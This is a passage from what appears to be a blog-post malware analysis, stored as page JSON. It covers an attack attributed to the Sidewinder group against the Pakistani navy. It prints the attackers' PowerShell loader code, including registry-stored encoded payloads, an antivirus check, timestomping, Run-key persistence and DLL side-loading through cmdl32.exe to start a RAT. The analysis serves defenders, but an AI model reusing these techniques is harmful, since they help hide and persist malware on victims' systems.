$binPath)){","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_41":{"__typename":"Paragraph","id":"9376201130db_41","name":"b496","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$b64 = dc -s ((Get-ItemProperty -Path $system).part1);\n $bytes = [System.Convert]::FromBase64String(“TVq” + $b64);\n $rn = [System.BitConverter]::GetBytes((Get-Random -Maximum 9999 -Minimum 1111))[0..1];\n [array]::copy($rn,0,$bytes,$bytes.length — 2,2);\n New-Item -ItemType Directory -Force -Path $binDir | Out-Null;\n [io.file]::WriteAllBytes($binPath,$bytes) | Out-Null;\n updt -t $binPath -b $cmdl32path","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_42":{"__typename":"Paragraph","id":"9376201130db_42","name":"9d6a","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$b64dll = dc -s ((Get-ItemProperty -Path $system).part2);\n $bytes = [System.Convert]::FromBase64String(“TVq” + $b64dll);\n [array]::copy($line,0,$bytes,(sb -h $bytes -n $buf6),64);\n New-Item -ItemType Directory -Force -Path $binDir | Out-Null;\n [io.file]::WriteAllBytes($binPathdll,$bytes) | Out-Null;\n updt -t $binPathdll -b $cmdl32path\n }","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_43":{"__typename":"Paragraph","id":"9376201130db_43","name":"ca4f","type":"BQ","href":null,"layout":null,"metadata":null,"text":"Remove-Item -Path $system | Out-Null;\n Remove-Item $PROFILE.CurrentUserAllHosts | Out-Null;\n New-ItemProperty -Path $run -Name “Winsound” -PropertyType String -Value $dmybinPath | Out-Null;\n \n Copy-Item $msvbvmdllpath $rpcdllpath\n updt -t $rpcdllpath -b $msvbvmdllpath","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_44":{"__typename":"Paragraph","id":"9376201130db_44","name":"28b4","type":"BQ","href":null,"layout":null,"metadata":null,"text":"Copy-Item $cmdl32path $dmybinPath\n updt -t $dmybinPath -b $cmdl32path","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_45":{"__typename":"Paragraph","id":"9376201130db_45","name":"737b","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$avr = Get-Process $pnameavr -ErrorAction SilentlyContinue\n if (!$avr) {\n &($dmybinPath) | Out-Null;\n }\n Exit\n}\ncatch {\n $_.Exception.Message | Out-Null;\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_46":{"__typename":"Paragraph","id":"9376201130db_46","name":"dd52","type":"P","href":null,"layout":null,"metadata":null,"text":"This powershell checks if the AV 360 is installed:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_47":{"__typename":"Paragraph","id":"9376201130db_47","name":"cc6b","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$pname36 = “3” + “60Tr” + “ay”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_48":{"__typename":"Paragraph","id":"9376201130db_48","name":"fd7e","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$q36 = Get-Process $pname36 -ErrorAction SilentlyContinue;\nif($q36){\n exit\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_49":{"__typename":"Paragraph","id":"9376201130db_49","name":"6f46","type":"P","href":null,"layout":null,"metadata":null,"text":"We can imagine the attackers were made a recon step before.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_50":{"__typename":"Paragraph","id":"9376201130db_50","name":"cfbc","type":"P","href":null,"layout":null,"metadata":null,"text":"The folder where the loadin chain is:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_51":{"__typename":"Paragraph","id":"9376201130db_51","name":"12ee","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$binDir = [Environment]::GetFolderPath([Enum]::ToObject([System.Environment+SpecialFolder], 35))+ “\\” + “Winset\\Config” + “\\”;","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_52":{"__typename":"Paragraph","id":"9376201130db_52","name":"dd1f","type":"P","href":null,"layout":null,"metadata":null,"text":"The powershell copies:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_53":{"__typename":"Paragraph","id":"9376201130db_53","name":"7853","type":"P","href":null,"layout":null,"metadata":null,"text":"$msvbvmdllpath = $env:WINDIR + “\\system32\\msvbvm60.dll”\n$cmdl32path = $env:WINDIR + “\\system32\\cmdl32.exe”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_54":{"__typename":"Paragraph","id":"9376201130db_54","name":"805a","type":"P","href":null,"layout":null,"metadata":null,"text":"Copy-Item $cmdl32path $dmybinPath","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_55":{"__typename":"Paragraph","id":"9376201130db_55","name":"b722","type":"P","href":null,"layout":null,"metadata":null,"text":"Copy-Item $msvbvmdllpath $rpcdllpath","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_56":{"__typename":"Paragraph","id":"9376201130db_56","name":"ba77","type":"P","href":null,"layout":null,"metadata":null,"text":"So msvbvm60.dll becomes: 57146C96.dll","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_57":{"__typename":"Paragraph","id":"9376201130db_57","name":"64ed","type":"P","href":null,"layout":null,"metadata":null,"text":"And Winset.exe and cmpbk32.dll are decoded and copied in the same folder.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_58":{"__typename":"Paragraph","id":"9376201130db_58","name":"4983","type":"P","href":null,"layout":null,"metadata":null,"text":"part1 and part2 is the reg key base here $system = ‘HKCU:Software\\Updater’;:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_59":{"__typename":"Paragraph","id":"9376201130db_59","name":"1042","type":"P","href":null,"layout":null,"metadata":null,"text":"objWSS.RegWrite “HKCU\\Software\\Updater”, “”\nobjWSS.RegWrite “HKCU\\Software\\Updater\\part1”, p1, “REG_SZ”\nobjWSS.RegWrite “HKCU\\Software\\Updater\\part2”, p2, “REG_SZ”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_60":{"__typename":"Paragraph","id":"9376201130db_60","name":"a53d","type":"P","href":null,"layout":null,"metadata":null,"text":"part1 is big blob of base64 data.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_61":{"__typename":"Paragraph","id":"9376201130db_61","name":"6308","type":"P","href":null,"layout":null,"metadata":null,"text":"Firstly the registry key is retrieve:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_62":{"__typename":"Paragraph","id":"9376201130db_62","name":"6384","type":"P","href":null,"layout":null,"metadata":null,"text":"(Get-ItemProperty -Path $system).part1","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_63":{"__typename":"Paragraph","id":"9376201130db_63","name":"1a64","type":"P","href":null,"layout":null,"metadata":null,"text":"after is the function dc is called.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_64":{"__typename":"Paragraph","id":"9376201130db_64","name":"992c","type":"BQ","href":null,"layout":null,"metadata":null,"text":"function dc($s){\n sal n New-Object;\n $data = [System.Convert]::FromBase64String(“H4sIAAAAAAA” + $s);\n $ms = n System.IO.MemoryStream;\n $ms.Write($data, 0, $data.Length);\n $ms.Seek(0,0) | Out-Null;\n return (n System.IO.StreamReader(n System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\n};","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_65":{"__typename":"Paragraph","id":"9376201130db_65","name":"35c5","type":"P","href":null,"layout":null,"metadata":null,"text":"this string “H4sIAAAAAAA” is added at part2 and the data is decoded an","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_66":{"__typename":"Paragraph","id":"9376201130db_66","name":"2852","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$data = [System.Convert]::FromBase64String(“H4sIAAAAAAA” + $s);","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_67":{"__typename":"Paragraph","id":"9376201130db_67","name":"ca52","type":"P","href":null,"layout":null,"metadata":null,"text":"and unzip:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_68":{"__typename":"Paragraph","id":"9376201130db_68","name":"5f3b","type":"BQ","href":null,"layout":null,"metadata":null,"text":"[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\n};","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_69":{"__typename":"Paragraph","id":"9376201130db_69","name":"ae1f","type":"P","href":null,"layout":null,"metadata":null,"text":"and the Mz header in base64 is added and decoded:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_70":{"__typename":"Paragraph","id":"9376201130db_70","name":"10e5","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$bytes = [System.Convert]::FromBase64String(“TVq” + $b64);","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_71":{"__typename":"Paragraph","id":"9376201130db_71","name":"762a","type":"P","href":null,"layout":null,"metadata":null,"text":"and the executable is modified for the last time and copied in $binDir:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_72":{"__typename":"Paragraph","id":"9376201130db_72","name":"442c","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$bytes = [System.Convert]::FromBase64String(“TVq” + $b64);\n $rn = [System.BitConverter]::GetBytes((Get-Random -Maximum 9999 -Minimum 1111))[0..1];\n [array]::copy($rn,0,$bytes,$bytes.length — 2,2);\n New-Item -ItemType Directory -Force -Path $binDir | Out-Null;\n [io.file]::WriteAllBytes($binPath,$bytes) | Out-Null;","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_73":{"__typename":"Paragraph","id":"9376201130db_73","name":"7639","type":"P","href":null,"layout":null,"metadata":null,"text":"The dll is decoded, modified and written on disk in the same way:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_74":{"__typename":"Paragraph","id":"9376201130db_74","name":"da3f","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$b64dll = dc -s ((Get-ItemProperty -Path $system).part2);\n $bytes = [System.Convert]::FromBase64String(“TVq” + $b64dll);\n [array]::copy($line,0,$bytes,(sb -h $bytes -n $buf6),64);\n New-Item -ItemType Directory -Force -Path $binDir | Out-Null;\n [io.file]::WriteAllBytes($binPathdll,$bytes) | Out-Null;\n updt -t $binPathdll -b $cmdl32path","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_75":{"__typename":"Paragraph","id":"9376201130db_75","name":"bcfb","type":"P","href":null,"layout":null,"metadata":null,"text":"The Trick very important here is : [array]::copy($line,0,$bytes,(sb -h $bytes -n $buf6),64); to modify the dll.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":35,"end":94,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_76":{"__typename":"Paragraph","id":"9376201130db_76","name":"8d37","type":"P","href":null,"layout":null,"metadata":null,"text":"If you decode the before the modification you have a dll truncated.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_77":{"__typename":"Paragraph","id":"9376201130db_77","name":"5f20","type":"P","href":null,"layout":null,"metadata":null,"text":"before:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*mwhQ9Jt9xLiVaH_mVv6uaw.png":{"__typename":"ImageMetadata","id":"1*mwhQ9Jt9xLiVaH_mVv6uaw.png","originalHeight":523,"originalWidth":989,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_78":{"__typename":"Paragraph","id":"9376201130db_78","name":"2d55","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*mwhQ9Jt9xLiVaH_mVv6uaw.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_79":{"__typename":"Paragraph","id":"9376201130db_79","name":"c640","type":"P","href":null,"layout":null,"metadata":null,"text":"after:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*gskxEMV2wHIwHkcKEQu-NQ.png":{"__typename":"ImageMetadata","id":"1*gskxEMV2wHIwHkcKEQu-NQ.png","originalHeight":539,"originalWidth":969,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_80":{"__typename":"Paragraph","id":"9376201130db_80","name":"31f7","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*gskxEMV2wHIwHkcKEQu-NQ.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_81":{"__typename":"Paragraph","id":"9376201130db_81","name":"48ef","type":"P","href":null,"layout":null,"metadata":null,"text":"In fact:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_82":{"__typename":"Paragraph","id":"9376201130db_82","name":"a0e4","type":"P","href":null,"layout":null,"metadata":null,"text":"The powershell modify the dll to add $lines","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_83":{"__typename":"Paragraph","id":"9376201130db_83","name":"32ff","type":"P","href":null,"layout":null,"metadata":null,"text":"and $lines","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_84":{"__typename":"Paragraph","id":"9376201130db_84","name":"45f6","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$line = new-object byte[] 64;\n$buf6 =[Byte[]] (,0x23 * 64);\n$cbytes = [system.Text.Encoding]::ASCII.GetBytes($cmdLine);\n[array]::copy($cbytes,$line,$cbytes.length);","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_85":{"__typename":"Paragraph","id":"9376201130db_85","name":"8e83","type":"P","href":null,"layout":null,"metadata":null,"text":"and $cmdLine","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_86":{"__typename":"Paragraph","id":"9376201130db_86","name":"642b","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$bin =Winset.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_87":{"__typename":"Paragraph","id":"9376201130db_87","name":"175a","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$cmdLine = ([int]$c).toString(“00000000”)+([int]$m).toString(“00000000”);\n$cmdLine = $bin+ “ “ +$cmdLine;\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_88":{"__typename":"Paragraph","id":"9376201130db_88","name":"28ce","type":"P","href":null,"layout":null,"metadata":null,"text":"like in the dll: .string “Winset.exe -0000000100001223","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_89":{"__typename":"Paragraph","id":"9376201130db_89","name":"924e","type":"P","href":null,"layout":null,"metadata":null,"text":"So we have in the same folder: Winset\\Config","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_90":{"__typename":"Paragraph","id":"9376201130db_90","name":"ccf4","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Winset.exe (part1 modified and decoded)is a fake Windows Security Configuration Editor Command Tool","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_91":{"__typename":"Paragraph","id":"9376201130db_91","name":"170f","type":"ULI","href":null,"layout":null,"metadata":null,"text":"cmpbk32.dll (part2 modified and decoded)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_92":{"__typename":"Paragraph","id":"9376201130db_92","name":"9727","type":"ULI","href":null,"layout":null,"metadata":null,"text":"57146C96.dll (vb virtual machine)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_93":{"__typename":"Paragraph","id":"9376201130db_93","name":"423f","type":"ULI","href":null,"layout":null,"metadata":null,"text":"cmdl32.exe (executable of windows)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_94":{"__typename":"Paragraph","id":"9376201130db_94","name":"e1ff","type":"P","href":null,"layout":null,"metadata":null,"text":"The powershell change timestamps of files copied:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_95":{"__typename":"Paragraph","id":"9376201130db_95","name":"a795","type":"BQ","href":null,"layout":null,"metadata":null,"text":"updt -t $binPathdll -b $cmdl32path","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_96":{"__typename":"Paragraph","id":"9376201130db_96","name":"84da","type":"BQ","href":null,"layout":null,"metadata":null,"text":"updt -t $binPath -b $cmdl32path","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_97":{"__typename":"Paragraph","id":"9376201130db_97","name":"1537","type":"BQ","href":null,"layout":null,"metadata":null,"text":"function updt($t, $b){\n (ls $t).LastWriteTime = (ls $b).LastWriteTime\n (ls $t).CreationTime = (ls $b).CreationTime\n (ls $t).LastAccessTime = (ls $b).LastAccessTime\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_98":{"__typename":"Paragraph","id":"9376201130db_98","name":"4f4a","type":"H3","href":null,"layout":null,"metadata":null,"text":"Persistance","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_99":{"__typename":"Paragraph","id":"9376201130db_99","name":"2a4d","type":"P","href":null,"layout":null,"metadata":null,"text":"The persistant is a hkey run very basic with the path of the dll in parameter:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_100":{"__typename":"Paragraph","id":"9376201130db_100","name":"2963","type":"P","href":null,"layout":null,"metadata":null,"text":"$run = ‘HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\’;","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_101":{"__typename":"Paragraph","id":"9376201130db_101","name":"9dd6","type":"P","href":null,"layout":null,"metadata":null,"text":"New-ItemProperty -Path $run -Name “Winsound” -PropertyType String -Value $dmybinPath | Out-Null;","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_102":{"__typename":"Paragraph","id":"9376201130db_102","name":"09a4","type":"P","href":null,"layout":null,"metadata":null,"text":"To reload cmpbk32.dll at each reboot of the system and execute the dllmain of the dll.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_103":{"__typename":"Paragraph","id":"9376201130db_103","name":"d509","type":"H3","href":null,"layout":null,"metadata":null,"text":"Loading Chain","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_104":{"__typename":"Paragraph","id":"9376201130db_104","name":"ce69","type":"P","href":null,"layout":null,"metadata":null,"text":"The powershell launch cmdl32.exe (“Connection Manager Phonebook Downloader”) trusted by AV because it’s develloped by Microsoft.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_105":{"__typename":"Paragraph","id":"9376201130db_105","name":"8812","type":"P","href":null,"layout":null,"metadata":null,"text":"this exe used: cmpbk32.dll","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*NyF5UD6MIWldtbpEr3y5IQ.png":{"__typename":"ImageMetadata","id":"1*NyF5UD6MIWldtbpEr3y5IQ.png","originalHeight":162,"originalWidth":634,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_106":{"__typename":"Paragraph","id":"9376201130db_106","name":"8d19","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*NyF5UD6MIWldtbpEr3y5IQ.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_107":{"__typename":"Paragraph","id":"9376201130db_107","name":"f4e3","type":"P","href":null,"layout":null,"metadata":null,"text":"So when cmdl32.exe is launched cmpbk32.dll is loaded. (in the same directory, side loading)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_108":{"__typename":"Paragraph","id":"9376201130db_108","name":"18a6","type":"P","href":null,"layout":null,"metadata":null,"text":"the entrypoint is exectuted.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*fQ8cDP8CRj8EmmzfKMnXRw.png":{"__typename":"ImageMetadata","id":"1*fQ8cDP8CRj8EmmzfKMnXRw.png","originalHeight":856,"originalWidth":1114,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_109":{"__typename":"Paragraph","id":"9376201130db_109","name":"adf3","type":"IMG","href":null,"layout":"OUTSET_CENTER","metadata":{"__ref":"ImageMetadata:1*fQ8cDP8CRj8EmmzfKMnXRw.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_110":{"__typename":"Paragraph","id":"9376201130db_110","name":"cce4","type":"P","href":null,"layout":null,"metadata":null,"text":"The important part is:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*eSBQqIXyF-U2Qq51FYXsMg.png":{"__typename":"ImageMetadata","id":"1*eSBQqIXyF-U2Qq51FYXsMg.png","originalHeight":203,"originalWidth":850,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_111":{"__typename":"Paragraph","id":"9376201130db_111","name":"c042","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*eSBQqIXyF-U2Qq51FYXsMg.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_112":{"__typename":"Paragraph","id":"9376201130db_112","name":"1fc1","type":"P","href":null,"layout":null,"metadata":null,"text":"The function sub.Winset.exe__0000000100001223_0 launches Winset.exe the real RAT like this “Winset.exe -0000000100001223” ; len=2","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*cyKfNUGcZs3qFmxqlZYEww.png":{"__typename":"ImageMetadata","id":"1*cyKfNUGcZs3qFmxqlZYEww.png","originalHeight":534,"originalWidth":1028,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_113":{"__typename":"Paragraph","id":"9376201130db_113","name":"170a","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*cyKfNUGcZs3qFmxqlZYEww.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_114":{"__typename":"Paragraph","id":"9376201130db_114","name":"5f0d","type":"P","href":null,"layout":null,"metadata":null,"text":"Winset.exe is RAT developed in VB6.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_115":{"__typename":"Paragraph","id":"9376201130db_115","name":"0754","type":"P","href":null,"layout":null,"metadata":null,"text":"You can find an complete analysis here: https:\u002F\u002Fs.tencent.com\u002Fresearch\u002Freport\u002F479.html","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":40,"end":86,"href":"https:\u002F\u002Fs.tencent.com\u002Fresearch\u002Freport\u002F479.html","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_116":{"__typename":"Paragraph","id":"9376201130db_116","name":"9fab","type":"H3","href":null,"layout":null,"metadata":null,"text":"Threat Intelligence","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_117":{"__typename":"Paragraph","id":"9376201130db_117","name":"0e1b","type":"P","href":null,"layout":null,"metadata":null,"text":"We have the TTPs described in Tencent with the same phases.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_118":{"__typename":"Paragraph","id":"9376201130db_118","name":"5363","type":"P","href":null,"layout":null,"metadata":null,"text":"Sidewinder is a Indian Group targeting Pakistan military infrastructure.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_119":{"__typename":"Paragraph","id":"9376201130db_119","name":"0430","type":"P","href":null,"layout":null,"metadata":null,"text":"The content of the RTF is cleary oriented to Navy Pakistani.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_120":{"__typename":"Paragraph","id":"9376201130db_120","name":"fdad","type":"P","href":null,"layout":null,"metadata":null,"text":"If we check the infrastructure of the 